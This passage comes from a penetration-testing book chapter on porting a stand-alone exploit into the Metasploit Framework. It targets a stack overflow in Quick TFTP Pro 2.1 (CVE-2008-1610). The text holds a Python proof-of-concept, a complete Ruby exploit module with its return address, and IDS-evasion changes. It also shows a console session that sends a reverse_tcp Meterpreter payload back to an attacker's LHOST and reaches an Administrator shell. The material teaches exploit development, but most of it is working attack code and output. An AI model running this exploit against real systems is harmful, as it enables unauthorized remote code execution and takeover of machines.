# Tested on Windows XP SP2.
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt
#########################################################
import socket
import sys

print "[*] Quick TFTP Pro 2.1 SEH Overflow (0day)"
print "[*] http://www.offensive-security.com"

host = '127.0.0.1'
port = 69

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)

filename = "pwnd"
shell = "\xcc" * 317

mode = "A"*1019+"\xeb\x08\x90\x90"+"\x58\x14\xd3\x74"+"\x90"*16+shell

muha = "\x00\x02" + filename+ "\0" + mode + "\0"

print "[*] Sending evil packet, ph33r"
s.sendto(muha, (host, port))
print "[*] Check port 4444 for bindshell"</pre><p class="calibre2">As we did with our previous JMP ESP example, we first create a skeleton for our new module by using a base example of an exploit similar to the one we used previously:</p><a id="I_programlisting15_d1e17910" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

        <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">include Msf::Exploit::Remote::Udp</code></strong>
        <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">include Msf::Exploit::Remote::Seh</code></strong>

       def initialize(info = {})
              super(update_info(info,
                     'Name'           =&gt; 'Quick TFTP Pro
 2.1 Long Mode Buffer Overflow',
                     'Description'    =&gt; %q{
                            This module exploits a stack overflow
 in Quick TFTP Pro 2.1.
                     },
                     'Author'         =&gt; 'Your Name',
                     'Version'        =&gt; '$Revision: 7724 $',
                     'References'     =&gt;
                            [
                                    ['CVE', '2008-1610'],
                                    ['OSVDB', '43784'],
                                    ['URL', 'http://www.
exploit-db.com/exploits/5315'],
                            ],
                     'DefaultOptions' =&gt;
                            {
                                   'EXITFUNC' =&gt; 'thread',
                            },
                     'Payload'        =&gt;
                            {
                                   'Space'    =&gt; 412,
                                   'BadChars' =&gt; "\x00\x20\x0a\x0d",
                                   'StackAdjustment' =&gt; −3500,
                            },
                     'Platform'       =&gt; 'win',
                     'Targets'        =&gt;
                            [
                                    [ 'Windows XP SP2',    { 'Ret' =&gt; 0x41414141 } ],
                            ],
                     'Privileged'     =&gt; true,
                     'DefaultTarget'  =&gt; 0,
                     'DisclosureDate' =&gt; 'Mar 3 2008'))

                      <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>register_options([<strong class="calibre3"><code class="calibre6">Opt::RPORT(69)</code></strong>], self.class)

       end

       def exploit
              connect_udp

              print_status("Trying target #{target.name}...")

                 <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">udp_sock.put(sploit)</code></strong>

              disconnect_udp
       end

end</pre><p class="calibre2">Because this exploit uses the Trivial File Transfer Protocol (TFTP), we need to include the <code class="literal">Msf::Exploit::Remote::Udp</code> mixin shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17951" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. And because it manipulates the structured exception handler, we also need to include the <code class="literal">Msf::Exploit::Remote::Seh</code> mixin shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17960" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> to gain access to certain functions that deal with SEH overflows. Because TFTP servers typically listen on UDP port 69, we declare that port at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17966" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> as the default for the module. Lastly, once the malicious string is built, the code is put on the wire at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17973" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.<a id="IDX-CHP-15-0066" class="strong"/><a id="IDX-CHP-15-0067" class="strong"/><a id="IDX-CHP-15-0068" class="strong"/><a id="IDX-CHP-15-0069" class="strong"/><a id="IDX-CHP-15-0070" class="strong"/><a id="IDX-CHP-15-0071" class="strong"/><a id="IDX-CHP-15-0072" class="strong"/></p><p class="calibre2">We begin by using the same skeleton from our original Python exploit earlier in this chapter for the TFTP exploit. We will be adding the major parts of it into our exploit section.</p><a id="I_programlisting15_d1e18004" class="strong"/><pre class="programlisting">def exploit
       connect_udp

       print_status("Trying target #{target.name}...")

       evil = "\x41" * 1019
     <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">evil &lt;&lt; "\xeb\x08\x90\x90"</code></strong>  # Short Jump
     <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/><strong class="calibre3"><code class="calibre6">evil &lt;&lt; "\x58\x14\xd3\x74"</code></strong>  # POP-POP-RETN
       evil &lt;&lt; "\x90" * 16   # NOP slide
       evil &lt;&lt; "\xcc" * 412  # Dummy Shellcode

     <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>sploit = "\x00\x02"
       sploit &lt;&lt; "pwnd"
       sploit &lt;&lt; "\x00"
       sploit &lt;&lt; evil
       sploit &lt;&lt; "\x00"

       udp_sock.put(sploit)

       disconnect_udp
end</pre><p class="calibre2">Following the initial string of <span class="strong"><em class="calibre4">A</em></span>s (1019 of them, represented by <code class="literal">\x41</code> in hexadecimal), we add a short jump at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e18037" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> to overwrite the Next SE Handler (NSEH). At the beginning of this chapter, we used a simple stack overflow example when we attacked MailCarrier and overwrote the instruction pointer. Here, we overwrite the SEH and the NSEH to break out of the structured exception handler. Then at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e18043" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we add the address of a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> sequence of instructions to overwrite SEH, which puts us into an area of memory that we control.<a id="IDX-CHP-15-0073" class="strong"/><a id="IDX-CHP-15-0074" class="strong"/><a id="IDX-CHP-15-0075" class="strong"/><a id="IDX-CHP-15-0076" class="strong"/><a id="IDX-CHP-15-0077" class="strong"/></p><p class="calibre2">Next, to make sure that the packet will be recognized as a write request by the TFTP server, we append <code class="literal">\x00\x02</code> after the shellcode at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e18073" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>.</p><p class="calibre2">Now, when we load the module and run it against our target, our debugger should pause with a SEH overwrite, as shown in <a class="xref" href="part0019.html#quick_tftp_apostrophy_s_initial_seh_over">Figure 15-4</a>.</p><div class="figure"><a id="quick_tftp_apostrophy_s_initial_seh_over" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e18086" class="strong"/><img src="../images/00057.jpeg" alt="Quick TFTP’s initial SEH overwrite" hisrc="httpatomoreillycomsourcenostarchimages867568.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-4. Quick TFTP’s initial SEH overwrite</div></div><p class="calibre2">Because that long string of <span class="strong"><em class="calibre4">A</em></span>s and the NOP slide sent to the application will set off IDS alarms, we’ll replace the <span class="strong"><em class="calibre4">A</em></span>s (as in the previous example) with a random selection of uppercase alphabetic characters, and replace the <code class="literal">\x90</code> characters with NOP equivalents, as shown in the following boldface code:</p><a id="I_programlisting15_d1e18102" class="strong"/><pre class="programlisting">evil = <strong class="calibre3"><code class="calibre6">rand_text_alpha_upper(1019</code></strong>)   # Was: "\x41" * 1019
evil &lt;&lt; "\xeb\x08\x90\x90"           # Short Jump
evil &lt;&lt; "\x58\x14\xd3\x74"           # pop/pop/ret
evil &lt;&lt; <strong class="calibre3"><code class="calibre6">make_nops(16)</code></strong>                # Was: "\x90" * 16  # NOP slide
evil &lt;&lt; "\xcc" * 412                 # Dummy Shellcode</pre><p class="calibre2">As always, it’s a good idea to check your new module’s functionality after every change. As you can see in <a class="xref" href="part0019.html#quick_tftp_buffer_with_random_characters">Figure 15-5</a>, the random characters have been accepted by the application and SEH is still controlled as it was before.<a id="IDX-CHP-15-0078" class="strong"/></p><div class="figure"><a id="quick_tftp_buffer_with_random_characters" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e18120" class="strong"/><img src="../images/00058.jpeg" alt="Quick TFTP buffer with random characters" hisrc="httpatomoreillycomsourcenostarchimages867570.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-5. Quick TFTP buffer with random characters</div></div><p class="calibre2">Now that we know that the module is still behaving properly, we can set the return address in the <code class="literal">'Targets'</code> definition. The address in this example is a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> from <span class="strong"><em class="calibre4">oledlg.dll</em></span>, as in the original exploit. Remember that if we can find a memory instruction set in the same application that is loaded every time, we can create a universal exploit that is not dependent on Microsoft DLLs and that can target every operating system. In this case, we use <span class="strong"><em class="calibre4">oledlg.dll</em></span> to make this exploit universal.<a id="IDX-CHP-15-0079" class="strong"/><a id="IDX-CHP-15-0080" class="strong"/><a id="IDX-CHP-15-0081" class="strong"/><a id="IDX-CHP-15-0082" class="strong"/></p><a id="I_programlisting15_d1e18152" class="strong"/><pre class="programlisting">'Targets'        =&gt;
      [
              <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>[ 'Windows XP SP2',  { 'Ret' =&gt; 0x74d31458 } ], # p/p/r oledlg
      ],</pre><p class="calibre2">We now have our target of Windows XP SP2 and a return address of 0x74d31458, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e18162" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><p class="calibre2">Next, we create a random, alphabetical, uppercase string of 1019 bytes:</p><a id="I_programlisting15_d1e18171" class="strong"/><pre class="programlisting">evil = rand_text_alpha_upper(1019)
evil &lt;&lt; <strong class="calibre3"><code class="calibre6">generate_seh_payload</code></strong>(target.ret)
evil &lt;&lt; make_nops(16)</pre><p class="calibre2">The <code class="literal">generate_seh_payload</code> function uses the declared return address and will automatically insert the short jump (which jumps us over the SEH handler). The <code class="literal">generate_seh_payload</code> function calculates the jumps for us, so it will go straight to the <span class="strong"><em class="calibre4">POP-POP-RETN</em></span>.</p><p class="calibre2">We run the module one last time with the dummy shellcode and see that our debugger contains numerous random characters, but everything is still under our direct control, as shown in <a class="xref" href="part0019.html#quick_tftp_fully_controlled">Figure 15-6</a>. Random characters can be better than NOPs in some cases, because they serve to trip up many IDSs that may be monitoring the network. Many signature-based IDSs can trigger over large volumes of NOPs.<a id="IDX-CHP-15-0083" class="strong"/><a id="IDX-CHP-15-0084" class="strong"/></p><div class="figure"><a id="quick_tftp_fully_controlled" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e18200" class="strong"/><img src="../images/00059.jpeg" alt="Quick TFTP fully controlled" hisrc="httpatomoreillycomsourcenostarchimages867572.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-6. Quick TFTP fully controlled</div></div><p class="calibre2">Next, we remove the dummy shellcode and run the module with a real payload to get our shell, as shown here:</p><a id="I_programlisting15_d1e18207" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use exploit/windows/tftp/quicktftp_book</code></strong>
msf exploit(quicktftp_book) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(quicktftp_book) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.1.101</code></strong>
LHOST =&gt; 192.168.1.101
msf exploit(quicktftp_book) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.1.155</code></strong>
RHOST =&gt; 192.168.1.155
msf exploit(quicktftp_book) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 192.168.1.101:4444
[*] Trying target Windows XP SP2...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 2 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1036)
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getuid</code></strong>
Server username: V-XP-SP2-BARE\Administrator</pre><p class="calibre2">Now that we have our Meterpreter shell, we’ve successfully ported an exploit and used the Framework in an SEH exploit!</p><a id="I_programlisting15_d1e18230" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
        include Msf::Exploit::Remote::Udp
        include Msf::Exploit::Remote::Seh

        def initialize(info = {})
                super(update_info(info,
                        'Name'           =&gt; 'Quick TFTP Pro 2.1
 Long Mode Buffer Overflow',
                        'Description'    =&gt; %q{
                                This module exploits a stack
 overflow in Quick TFTP Pro 2.1.
                        },
                        'Author'         =&gt; 'Your Name',
                        'Version'        =&gt; '$Revision: 7724 $',
                        'References'     =&gt;
                                [
                                         ['CVE', '2008-1610'],
                                         ['OSVDB', '43784'],
                                         ['URL', 'http://www.exploit-
db.com/exploits/5315'],
                                ],
                        'DefaultOptions' =&gt;
                                {
                                         'EXITFUNC' =&gt; 'thread',
                                },
                        'Payload'        =&gt;
                                {
                                         'Space'    =&gt; 412,
                                         'BadChars' =&gt; "\x00\x20\x0a\x0d",
                                         'StackAdjustment' =&gt; −3500,
                                },
                        'Platform'       =&gt; 'win',
                        'Targets'        =&gt;
                                [
                                         [ 'Windows XP SP2',
     { 'Ret' =&gt; 0x74d31458 } ],
                                               # p/p/r oledlg
                                ],
                        'Privileged'     =&gt; true,
                        'DefaultTarget'  =&gt; 0,
                        'DisclosureDate' =&gt; 'Mar 3 2008'))

                        register_options([Opt::RPORT(69)], self.class)

        end

        def exploit
                connect_udp

                print_status("Trying target #{target.name}...")

                evil = rand_text_alpha_upper(1019)
                evil &lt;&lt; generate_seh_payload(target.ret)
                evil &lt;&lt; make_nops(16)

                sploit = "\x00\x02"
                sploit &lt;&lt; "pwnd"
                sploit &lt;&lt; "\x00"
                sploit &lt;&lt; evil
                sploit &lt;&lt; "\x00"

                udp_sock.put(sploit)

                disconnect_udp
        end

end</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id6">Wrapping Up</h2></div></div></div><p class="calibre2">This chapter was designed to help you understand how to port different stand-alone exploits into the Metasploit Framework. You can import into the Framework in a number of ways, and different exploits will require different approaches and techniques.</p><p class="calibre2">At the beginning of this chapter, you learned how to use some basic assembly instructions to perform a simple stack overflow and port it into the Framework. We moved on to SEH overwrites, which we were able to use to maneuver around the handler and gain remote code execution. We used a <span class="strong"><em class="calibre4">pop/pop/ret</em></span> technique to gain the ability to execute code remotely, and we used Metasploit to open a Meterpreter shell.</p><p class="calibre2">In the next chapter, we will begin to dive into the Meterpreter scripting language and post exploitation modules. When we compromise a system and leverage Meterpreter, we can perform a number of additional attacks. We’ll create our own Meterpreter scripts and learn how the Framework is structured and how use it to maximum effect.</p></div></section></body></html>